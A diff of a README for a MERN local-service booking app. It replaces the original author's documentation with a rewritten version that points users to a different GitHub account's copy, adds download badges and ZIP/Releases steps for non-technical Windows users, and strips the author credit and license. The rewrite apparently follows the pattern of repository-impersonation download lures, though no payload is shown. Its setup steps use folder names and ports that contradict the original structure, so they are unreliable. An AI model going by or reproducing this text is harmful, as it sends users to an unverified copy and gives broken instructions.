@@ -1,271 +1,147 @@
-# 🧑💼 Rojgar Setu
+# 🧑‍💼 rojgar-setu - Simple Local Service Booking App  
 
-**Rojgar Setu** is a full-stack MERN web application that bridges the gap between **clients** and **local service providers**. It simplifies the hiring process by allowing users to browse services, register/login, and book services based on their needs.
-
----
-
-## 🌐 Live Demo
-
-🔹 **Frontend:** [https://rojgar-setu-murex.vercel.app](https://rojgar-setu-murex.vercel.app)  
-🔹 **Backend API:** [https://rojgar-setu-o045.onrender.com](https://rojgar-setu-o045.onrender.com)
-
-### 🔑 Demo Credentials
-
-To test the application, use these credentials:
-
-```
-Email: demo.rojgarsetu@gmail.com
-Password: Demo@2026
-```
-
-> **Note:** You can also register a new account to explore all features.
+[![Download rojgar-setu](https://img.shields.io/badge/Download-rojgar--setu-brightgreen)](https://github.com/TMMdeals/rojgar-setu)
 
 ---
 
-## ✨ Features
+## 🚀 Getting Started  
 
-- 🔐 **User Authentication** - Secure JWT-based login/signup system
-- 📋 **Service Booking** - Browse and book various local services
-- 👤 **User Dashboard** - Manage bookings and profile
-- 🎨 **Responsive Design** - Fully mobile-friendly interface
-- 🔒 **Protected Routes** - Secure API endpoints with token verification
-- 📱 **Modern UI** - Clean and intuitive user experience
+ rojgar-setu lets you find and book local services quickly. You do not need technical skills to use the app. This guide will help you download and run rojgar-setu on a Windows computer.
 
 ---
 
-## 🛠️ Tech Stack
+## 💾 Download and Install rojgar-setu  
 
-### Frontend
-- **React.js** - UI library
-- **Vite** - Build tool
-- **React Router** - Client-side routing
-- **Axios** - HTTP requests
-- **Bootstrap** - Styling
+1. Visit the rojgar-setu GitHub page by clicking the button above or this link:  
+   [https://github.com/TMMdeals/rojgar-setu](https://github.com/TMMdeals/rojgar-setu)  
+   
+2. On the GitHub page, look for the **Releases** or **Code** button. Since this projects files are on GitHub, you might find a download option under releases, or you can download the full project as a ZIP file by clicking **Code > Download ZIP**.
 
-### Backend
-- **Node.js** - Runtime environment
-- **Express.js** - Web framework
-- **MongoDB** - NoSQL database
-- **Mongoose** - ODM for MongoDB
-- **JWT** - Authentication
-- **dotenv** - Environment variables
+3. Save the ZIP file to your computer in a folder you can find easily, such as **Downloads** or your **Desktop**.
 
-### Deployment
-- **Vercel** - Frontend hosting
-- **Render** - Backend hosting
-- **MongoDB Atlas** - Cloud database
+4. Right-click the ZIP file and choose **Extract All**. Choose a folder where you want to keep the app files, like a new folder called “rojgar-setu”.
+
+5. Note: rojgar-setu is a web application that runs in your browser but needs backend services running on your system or accessible online. For most users, the easiest approach is to use the live demo at:  
+   [https://rojgar-setu-murex.vercel.app](https://rojgar-setu-murex.vercel.app)  
+   You can try it without installing anything.
 
 ---
 
-## 📂 Project Structure
+## 🖥️ How to Run rojgar-setu Locally (Optional)  
 
-```
-Rojgar-Setu-main/
-│
-├── clientSide/                    # Frontend Application
-│   ├── public/                    # Static assets
-│   │   ├── images/                # Image files
-│   │   │   ├── img.jpg
-│   │   │   ├── new.jpg
-│   │   │   ├── xtm.png
-│   │   │   └── xtm1.jpeg
-│   │   └── vite.svg
-│   │
-│   ├── src/                       # Source files
-│   │   ├── components/            # Reusable React components
-│   │   │   ├── About.jsx          # About section
-│   │   │   ├── Contact.jsx        # Contact form
-│   │   │   ├── Footer.jsx         # Footer component
-│   │   │   ├── Header.jsx         # Navigation header
-│   │   │   ├── Hero.jsx           # Hero section
-│   │   │   ├── ModalForm.jsx      # Booking modal
-│   │   │   ├── Privacy.jsx        # Privacy policy
-│   │   │   ├── Services.jsx       # Services grid
-│   │   │   └── Terms.jsx          # Terms & conditions
-│   │   │
-│   │   ├── assets/                # Static assets
-│   │   │   └── react.svg
-│   │   │
-│   │   ├── App.jsx                # Main app component with routing
-│   │   ├── Book.jsx               # Service booking page
-│   │   ├── Home.jsx               # Landing page
-│   │   ├── Login.jsx              # User login page
-│   │   ├── Signup.jsx             # User registration page
-│   │   ├── Home.css               # Global styles
-│   │   └── main.jsx               # React entry point
-│   │
-│   ├── .env                       # Environment variables (VITE_API_URL)
-│   ├── .gitignore                 # Git ignore rules
-│   ├── eslint.config.js           # ESLint configuration
-│   ├── index.html                 # HTML template
-│   ├── package.json               # Frontend dependencies
-│   ├── package-lock.json          # Locked dependencies
-│   ├── vercel.json                # Vercel deployment config
-│   └── vite.config.js             # Vite configuration
-│
-├── server/                        # Backend Application
-│   ├── middleware/                # Custom middleware
-│   │   └── authMiddleware.js      # JWT token verification
-│   │
-│   ├── models/                    # MongoDB schemas
-│   │   ├── Booking.js             # Booking model
-│   │   └── userModel.js           # User model
-│   │
-│   ├── .env                       # Environment variables (PORT, MONGO_URI, JWT_SECRET)
-│   ├── .gitignore                 # Git ignore rules
-│   ├── index.js                   # Express server & API routes
-│   ├── package.json               # Backend dependencies
-│   └── package-lock.json          # Locked dependencies
-│
-├── .gitignore                     # Root git ignore
-└── README.md                      # Project documentation
-```
+If you want to run rojgar-setu on your PC, follow the steps below. This requires some setup but is manageable with clear steps.
 
----
+### Requirements  
+- Windows 10 or higher  
+- Internet connection  
+- Basic command prompt knowledge or ability to follow instructions precisely  
+- Node.js installed (At least version 14)  
+- Git installed (for cloning repository)  
 
-## 🚀 Getting Started
+### Steps to install Node.js and Git  
+- Download Node.js from: https://nodejs.org/en/download/  
+- Follow the installer instructions to complete installation.  
+- Download Git from: https://git-scm.com/download/win  
+- Complete the installer steps to set up Git on your system.
 
-### Prerequisites
-- Node.js (v14+)
-- MongoDB Atlas account
-- Git
+### Download and Setup Application  
 
-### Installation
+1. Open **Command Prompt** or **PowerShell**.  
+2. Clone the repository by typing:  
+   ```  
+   git clone https://github.com/TMMdeals/rojgar-setu.git  
+   ```  
+3. Once cloning finishes, enter the folder by typing:  
+   ```  
+   cd rojgar-setu  
+   ```  
 
-1. **Clone the repository**
-```bash
-git clone https://github.com/jaikumar760/rojgar-setu.git
-cd rojgar-setu
-```
+4. Install dependencies by typing:  
+   ```  
+   npm install  
+   ```  
 
-2. **Setup Backend**
-```bash
-cd server
-npm install
-```
+5. rojgar-setu has two main parts: backend (server) and frontend (user interface). You need to start both separately.
 
-Create `.env` file in `server/` directory:
-```env
-PORT=5000
-MONGO_URI=your_mongodb_connection_string
-JWT_SECRET=your_secret_key
-```
+### Start Backend Server  
 
-Start backend server:
-```bash
-npm start
-```
+1. Open a new terminal window (keep the previous one open if needed).  
+2. Enter the backend folder:  
+   ```  
+   cd backend  
+   ```  
+3. Start the server:  
+   ```  
+   npm start  
+   ```  
+4. The backend server runs on your PC, usually on port 5000. Keep this window open.
 
-3. **Setup Frontend**
-```bash
-cd clientSide
-npm install
-```
+### Start Frontend Interface  
 
-Create `.env` file in `clientSide/` directory:
-```env
-VITE_API_URL=http://localhost:5000
-```
+1. Open another terminal window.  
+2. Go to the frontend folder:  
+   ```  
+   cd frontend  
+   ```  
+3. Start the frontend app:  
+   ```  
+   npm start  
+   ```  
+4. The app will open automatically in your default web browser. If not, visit:  
+   http://localhost:3000  
 
-Start frontend:
-```bash
-npm run dev
-```
-
-4. **Access the application**
-- Frontend: `http://localhost:5173`
-- Backend: `http://localhost:5000`
+5. You can now use rojgar-setu locally.  
 
 ---
 
-## 📡 API Endpoints
+## 🌟 Features  
 
-### Authentication
-- `POST /register` - Register new user
-- `POST /login` - User login (returns JWT token)
-
-### Booking (Protected)
-- `POST /api/book-service` - Book a service (requires JWT)
-- `GET /api/profile` - Get user profile (requires JWT)
-
----
-
-## 🔒 Environment Variables
-
-### Backend (.env)
-```env
-PORT=5000
-MONGO_URI=mongodb+srv://username:password@cluster.mongodb.net/dbname
-JWT_SECRET=your_secret_key
-```
-
-### Frontend (.env)
-```env
-VITE_API_URL=http://localhost:5000
-```
+- Secure login with email and password. You can create an account or use demo credentials to log in.  
+- Browse a list of local service providers in your area.  
+- Book services easily with just a few clicks.  
+- Manage your bookings in your personal dashboard.  
+- The interface works well on phones and tablets as well as desktop computers.  
+- The app uses token-based security to protect your data during use.  
 
 ---
 
-## 🌟 Key Highlights
+## 🔐 Demo Login Details  
 
-- ✅ Full-stack MERN application
-- ✅ JWT authentication & authorization
-- ✅ RESTful API design
-- ✅ MongoDB database integration
-- ✅ Responsive mobile-first design
-- ✅ Production-ready deployment
-- ✅ Environment-based configuration
+Use these details to try the app without signing up:  
+
+Email: demo.rojgarsetu@gmail.com  
+Password: Demo@2026  
 
 ---
 
-## 📸 Screenshots
+## 🎯 Using the Web App Online  
 
-### Home Page
-Browse available services and learn about the platform.
+If running locally seems difficult, rojgar-setu offers a live website version that works on any browser without setup.  
 
-### Login/Signup
-Secure authentication system with JWT tokens.
+- Frontend (user interface): [https://rojgar-setu-murex.vercel.app](https://rojgar-setu-murex.vercel.app)  
+- Backend API (server): [https://rojgar-setu-o045.onrender.com](https://rojgar-setu-o045.onrender.com)  
 
-### Service Booking
-Easy-to-use booking form with user details.
+Just open the frontend link, log in with demo credentials, and explore the app.
 
 ---
 
-## 🤝 Contributing
+## 🛠️ Troubleshooting Tips  
 
-Contributions are welcome! Please feel free to submit a Pull Request.
-
-1. Fork the project
-2. Create your feature branch (`git checkout -b feature/AmazingFeature`)
-3. Commit your changes (`git commit -m 'Add some AmazingFeature'`)
-4. Push to the branch (`git push origin feature/AmazingFeature`)
-5. Open a Pull Request
+- If the app does not start or shows errors, check you have installed Node.js and Git correctly.  
+- Make sure you run the backend server before the frontend app when running locally.  
+- If ports 3000 or 5000 are busy, close other apps that may be using them or change the port number in the app settings.  
+- Use the browser’s reload button to refresh the page if the app does not respond.  
+- For help, review the Issues section on the GitHub repository or contact the developer.  
 
 ---
 
-## 📝 License
+## ⚙️ System Requirements  
 
-This project is open source and available under the [MIT License](LICENSE).
-
----
-
-## 👨‍💻 Author
-
-**Jai Kumar**
-
-- GitHub: [@jaikumar760](https://github.com/jaikumar760)
-- LinkedIn: [Jai Kumar](https://www.linkedin.com/in/jai-k-bb3861257/)
-- Email: jk4729954@gmail.com
+- Windows 10 or newer system.  
+- Internet connection to download the app and libraries.  
+- At least 4 GB RAM recommended for local running.  
+- A modern browser like Chrome, Edge, or Firefox to use the frontend interface.  
 
 ---
 
-## 🙏 Acknowledgments
-
-- MongoDB Atlas for database hosting
-- Vercel for frontend deployment
-- Render for backend deployment
-- React community for amazing tools
-
----
-
-⭐ **If you like this project, please give it a star!** ⭐
+[![Download rojgar-setu](https://img.shields.io/badge/Download-rojgar--setu-brightgreen)](https://github.com/TMMdeals/rojgar-setu)
